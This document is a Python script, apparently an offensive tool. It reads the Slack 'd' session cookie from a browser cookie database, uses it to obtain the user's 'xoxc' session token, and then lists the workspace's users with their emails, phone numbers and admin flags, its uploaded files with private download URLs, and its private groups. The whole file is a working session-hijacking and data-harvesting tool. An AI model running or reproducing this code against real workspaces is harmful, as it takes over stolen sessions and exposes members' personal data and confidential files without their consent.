import requests
import json
import re
import argparse
import sys
import os
import sqlite3



parser = argparse.ArgumentParser(description='Script to pull all information from slack using its cookies.')
parser.add_argument('-c','--cookie', dest='cookie', nargs='?', help='Path To Slack Cookies File (REQUIRED)')
parser.add_argument('-a','--all', dest='all', action='store_true',default = 'False', help='Pull all information (Default)')
parser.add_argument('-u','--user', dest='user', action='store_true', help='Pull information on all users')
parser.add_argument('-f','--files', dest='files', action='store_true', help='Pull information on all files uploaded to workspace')
parser.add_argument('-p','--private_groups', dest='p_groups', action='store_true', help='Pull information on all private groups in workspace')


args = parser.parse_args()

if args.user is not True and args.files is not True and args.p_groups is not True:
	args.all = True
else:
	args.all = None

if args.cookie is not None:
	if os.path.exists(args.cookie):
		try:
			conn = sqlite3.connect( args.cookie )
			c = conn.cursor()
			c.execute('SELECT value FROM Cookies WHERE name = "d" AND host_key = ".slack.com"')
			d_value = c.fetchone()[0]

		except sqlite3.Error as e:
			print ("[-] Error reading database file :", e.args[0])
			sys.exit(1)
	else:
		print ("Path to Cookie file is invalid")
else:
	print ("[-] --cookie option is required for the script to run")
	parser.print_help()
	sys.exit(1)


print ("[*] Requesting Slack 'xoxc' token")

cookies = {'d':d_value}
headers = {'User-Agent':"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36"}
r1 = requests.get('https://app.slack.com/auth?app=client', cookies=cookies, headers=headers)
#print (r1.text)

try:
	tok = re.search(r'\"token\"[:]\"xoxc-\w*-\w*-\w*-\w*\"', r1.text)
	
	xoxc_token = tok[0][9:-1]

	print ("[*] Successfully pulled 'xoxc' token : " + xoxc_token )
except:
	print ("[-] Error retrieving 'xoxc' token")
	sys.exit(1)


if args.all or args.user:
	print ("\n---------------------------------------------\n")

	print ("[*] Enumerating All User Data in the Slack Workspace")
	cookies = {'d':d_value}
	r2 = requests.get('https://slack.com/api/users.list?token='+ xoxc_token+'&pretty=1',cookies=cookies)
	users = r2.json()
	
	for i in range(len(users['members'])):
		print ("\n")
		try:
			print ("Full Name : {0}".format(users['members'][i]['profile']['real_name_normalized'].encode('utf-8')))
		except KeyError:
			pass
		try:
			print ("Email : {0}".format(users['members'][i]['profile']['email'].encode('utf-8')))
		except KeyError:
			pass
		try:
			print ("Phone : {0}".format(users['members'][i]['profile']['phone'].encode('utf-8')))
		except KeyError:
			pass
		try:
			print ("Admin : {0}".format(users['members'][i]['is_admin']))
		except KeyError:
			pass
		try:
			print ("TimeZone : {0} ( {1} )".format(users['members'][i]['tz'],users['members'][i]['tz_label'].encode('utf-8')))
		except KeyError:
			pass
		
	#print json.dumps(r2.json(), sort_keys=True, indent=4)
	print ("\n---------------------------------------------\n")

if args.all or args.files:
	print ("\n---------------------------------------------\n")

	print ("[*] Enumerating All Files in the Slack Workspace")
	cookies = {'d':d_value}
	r3 = requests.get('https://slack.com/api/files.list?token='+xoxc_token,cookies=cookies)

	file = r3.json()
	for f in range(len(file['files'])):
		print ("\n")
		try:
			print ("Title : {0}".format(file['files'][f]['title'].encode('utf-8')))
		except KeyError:
			pass
		try:
			print ("File Type : {0}".format(file['files'][f]['mimetype'].encode('utf-8')))
		except KeyError:
			pass
		try:
			print ("Download URL : {0}".format(file['files'][f]['url_private_download'].encode('utf-8')))
		except KeyError:
			pass
		try:
			print ("Contains : {0}".format(file['files'][f]['pretty_type'].encode('utf-8')))
		except KeyError:
			pass
		try:
			print ("Editable : {0}".format(file['files'][f]['editable']))
		except KeyError:
			pass

	#print json.dumps(r3.json(), sort_keys=True, indent=4)
	print ("\n---------------------------------------------\n")

if args.all or args.p_groups:
	print ("\n---------------------------------------------\n")

	print ("[*] Enumerating All Private Groups in the Slack Workspace")
	cookies = {'d':d_value}
	r4 = requests.get('https://slack.com/api/groups.list?token='+xoxc_token,cookies=cookies)

	pgroup = r4.json()
	for g in range(len(pgroup['groups'])):
		print ("\n")
		try:
			print ("Name : {0}".format(pgroup['groups'][g]['name_normalized'].encode('utf-8')))
		except KeyError:
			pass
		try:
			print ("Topic : {0}".format(pgroup['groups'][g]['topic']['value'].encode('utf-8')))
		except KeyError:
			pass
		try:
			print ("Purpose : {0}".format(pgroup['groups'][g]['purpose']['value'].encode('utf-8')))
		except KeyError:
			pass

	#print json.dumps(r2.json(), sort_keys=True, indent=4)
	print ("\n---------------------------------------------\n")